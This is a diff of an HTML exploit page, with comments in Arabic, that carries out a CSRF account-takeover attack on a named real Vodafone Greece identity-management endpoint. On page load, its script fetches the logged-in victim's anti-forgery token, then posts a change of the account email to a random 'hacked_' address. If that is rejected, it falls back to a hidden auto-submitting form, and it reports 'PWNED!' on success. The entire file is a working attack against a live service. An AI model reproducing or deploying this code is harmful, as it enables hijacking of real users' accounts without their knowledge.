@@ -2,20 +2,21 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PoC Executing...</title>
+    <title>Critical Security Demonstration</title>
 </head>
 <body>
-    <div id="msg" style="font-family: sans-serif; font-weight: bold; padding: 20px;">Initializing...</div>
+    <div id="msg" style="font-family: Arial, sans-serif; padding: 20px;">
+        <h2>System Processing...</h2>
+        <p id="status">Initiating Sequence...</p>
+    </div>
 
     <script>
-        // المتغيرات الأساسية
         const target = "https://identity.facilitymanagement.iot.vodafone.gr/identity/Manage";
 
-        async function executePackageDoom() {
+        async function startPwn() {
             try {
-                document.getElementById('msg').innerText = "Step 1: Sniffing Token...";
-                
-                // 1. سحب التوكن (GET)
+                // 1. سحب التوكن (الخطوة اللي بتسبق الـ POST)
+                document.getElementById('status').innerText = "Step 1: Extracting CSRF Token...";
                 const response = await fetch(target, { method: 'GET', credentials: 'include' });
                 const html = await response.text();
                 const parser = new DOMParser();
@@ -23,79 +24,90 @@
                 const token = doc.querySelector('input[name="__RequestVerificationToken"]')?.value;
 
                 if (!token) {
-                    document.getElementById('msg').innerText = "❌ Token missing! (Are you logged in to Vodafone?)";
+                    document.getElementById('status').innerText = "❌ Error: Could not capture token.";
                     return;
                 }
 
-                document.getElementById('msg').innerText = "Step 2: Token Captured! Executing CSRF Attack...";
-
-                const newEmail = `hacked_${Math.random().toString(36).substring(7)}@vodafone-poc.io`;
+                // 2. تنفيذ الـ POST (الضربة القاضية)
+                document.getElementById('status').innerText = "Step 2: Sending POST Payload...";
                 
-                const details = {
-                    'IsEmailConfirmed': 'True',
-                    'Email': newEmail,
-                    'PhoneNumber': '',
-                    'Name': 'Xia0Checkmate',
-                    'Website': '',
-                    'Profile': '',
-                    'StreetAddress': '',
-                    'Locality': '12',
-                    'Region': '',
-                    'PostalCode': '',
-                    'Country': '',
-                    '__RequestVerificationToken': token 
-                };
+                const newEmail = `hacked_${Math.random().toString(36).substring(7)}@test.io`;
+                
+                // بناء الـ Body بنفس الترتيب اللي بالـ Burp
+                const bodyData = new URLSearchParams();
+                bodyData.append('IsEmailConfirmed', 'True');
+                bodyData.append('Email', newEmail);
+                bodyData.append('PhoneNumber', '');
+                bodyData.append('Name', '');
+                bodyData.append('Website', '');
+                bodyData.append('Profile', '');
+                bodyData.append('StreetAddress', '');
+                bodyData.append('Locality', '12');
+                bodyData.append('Region', '');
+                bodyData.append('PostalCode', '');
+                bodyData.append('Country', '');
+                bodyData.append('__RequestVerificationToken', token);
 
-                // محاولة الإرسال عبر Fetch
-                let formBody = [];
-                for (let property in details) {
-                    formBody.push(encodeURIComponent(property) + "=" + encodeURIComponent(details[property]));
-                }
-                formBody = formBody.join("&");
-
+                // إرسال الـ POST وتوقع الـ Redirect
                 const postRes = await fetch(target, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: formBody,
-                    credentials: 'include'
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        // هاد الهيدر ضروري في بعض نسخ ASP.NET
+                        'RequestVerificationToken': token 
+                    },
+                    body: bodyData,
+                    credentials: 'include',
+                    redirect: 'follow' // عشان يلحق الـ GET اللي بصير بعد الـ POST تلقائياً
                 });
 
-                // إذا فشل الـ Fetch (CORS/400)، ننتقل للفورم الصامت فوراً
-                if (postRes.status === 400 || !postRes.ok) {
-                    document.getElementById('msg').innerText = "⚠️ Fetch blocked. Using Fallback Form...";
-                    setTimeout(() => { submitSilentForm(details); }, 1000);
+                if (postRes.ok) {
+                    document.getElementById('status').innerHTML = 
+                        `<h2 style="color:green">✅ PWNED!</h2><p>Email changed to: <b>${newEmail}</b></p>`;
                 } else {
-                    document.getElementById('msg').innerHTML = "<h2 style='color:green'>✅ Success! Check your account.</h2>";
+                    // إذا لسا فيه 400، رح نلجأ للفورم التقليدي لأنه أضمن مع الـ Redirects
+                    document.getElementById('status').innerText = "⚠️ Fetch rejected. Using Form Fallback...";
+                    submitAsForm(token, newEmail);
                 }
 
             } catch (err) {
-                document.getElementById('msg').innerText = "❌ Error: " + err.message;
-                // في حال حدوث أي خطأ، جرب الفورم كخيار أخير
-                const backupEmail = `backup_${Math.random().toString(36).substring(7)}@vodafone.io`;
-                // submitSilentForm({...details, Email: backupEmail}); 
+                document.getElementById('status').innerText = "❌ Error: " + err.message;
             }
         }
 
-        // دالة الفورم الصامت (القاضية)
-        function submitSilentForm(data) {
+        function submitAsForm(token, email) {
             const form = document.createElement('form');
             form.method = 'POST';
             form.action = target;
-            for (const key in data) {
+
+            const fields = {
+                'IsEmailConfirmed': 'True',
+                'Email': email,
+                'PhoneNumber': '',
+                'Name': '',
+                'Website': '',
+                'Profile': '',
+                'StreetAddress': '',
+                'Locality': '12',
+                'Region': '',
+                'PostalCode': '',
+                'Country': '',
+                '__RequestVerificationToken': token
+            };
+
+            for (const name in fields) {
                 const input = document.createElement('input');
                 input.type = 'hidden';
-                input.name = key;
-                input.value = data[key];
+                input.name = name;
+                input.value = fields[name];
                 form.appendChild(input);
             }
+
             document.body.appendChild(form);
-            form.submit();
+            form.submit(); // هاد رح يعمل الـ POST والـ Redirect (GET) تلقائياً بالمتصفح
         }
 
-        // --- هاد السطر هو اللي بيشغل كل الحفلة ---
-        window.onload = function() {
-            executePackageDoom();
-        };
+        window.onload = startPwn;
     </script>
 </body>
 </html>
